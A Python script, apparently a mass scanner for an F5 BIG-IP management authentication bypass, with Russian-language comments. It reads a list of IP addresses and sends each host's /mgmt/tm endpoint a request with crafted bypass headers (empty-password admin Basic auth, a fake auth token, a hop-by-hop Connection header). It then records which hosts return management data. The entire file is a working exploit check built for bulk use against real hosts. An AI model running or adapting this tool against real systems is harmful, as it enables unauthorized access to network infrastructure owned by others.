import asyncio
import aiohttp
import argparse
from termcolor import colored
import time

DEBUG = False

async def scan_host(session, host, output_file, log_file, vulnerable_hosts):
    url = f"https://{host}/mgmt/tm"
    headers = {
        "Authorization": "Basic YWRtaW46",
        "X-F5-Auth-Token": "1",
        "Connection": "X-Forwarded-Host, X-F5-Auth-Token",
        "Content-Length": "0"
    }

    try:
        if DEBUG:
            debug_message = f"Sending request to {url}"
            log_file.write(debug_message + "\n")

        async with session.get(url, headers=headers, timeout=16, ssl=False) as response:
            if DEBUG:
                response_message = f"Received response from {url}: {response.status}"
                log_file.write(response_message + "\n")

            if response.status == 200:
                text = await response.text()
                if DEBUG:
                    response_text = f"Response text: {text}"
                    log_file.write(response_text + "\n")

                if "\"items\":[" in text:
                    result = colored(f"[*] {host} is vulnerable", 'green')
                    with open(output_file, "a") as results_file:
                        results_file.write(result + "\n")
                    vulnerable_hosts.append(host)
                    print(result)  # Вывод результата на экран
                else:
                    result = colored(f"[*] {host} doesn't appear vulnerable", 'red')
                    print(result)  # Вывод результата на экран
            else:
                result = colored(f"[*] {host} doesn't appear vulnerable with status code {response.status}", 'red')
                print(result)  # Вывод результата на экран
    except Exception as e:
        result = colored(f"[*] {host} doesn't appear vulnerable: {str(e)}", 'red')
        print(result)  # Вывод результата на экран

async def main(filename, output_file):
    with open(filename, "r") as host_file:
        async with aiohttp.ClientSession() as session:
            tasks = []
            log_file = open("log.txt", "w")
            vulnerable_hosts = []

            for host in host_file:
                host = host.strip()
                task = scan_host(session, host, output_file, log_file, vulnerable_hosts)
                tasks.append(task)

            await asyncio.gather(*tasks)
            log_file.close()

            end_time = time.time()
            elapsed_time = end_time - start_time

            print(f"Результаты записаны в файл {output_file}. Уязвимых хостов найдено - {len(vulnerable_hosts)}")
            print(f"Время работы скрипта: {elapsed_time} секунд")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Asynchronous scanner for F5 vulnerability")
    parser.add_argument("-f", "--file", required=True, help="File with IP addresses")
    parser.add_argument("-o", "--output", default="results.txt", help="Output file for results")

    args = parser.parse_args()
    with open(args.output, "w") as results_file:
        results_file.write("")

    start_time = time.time()
    asyncio.run(main(args.file, args.output))
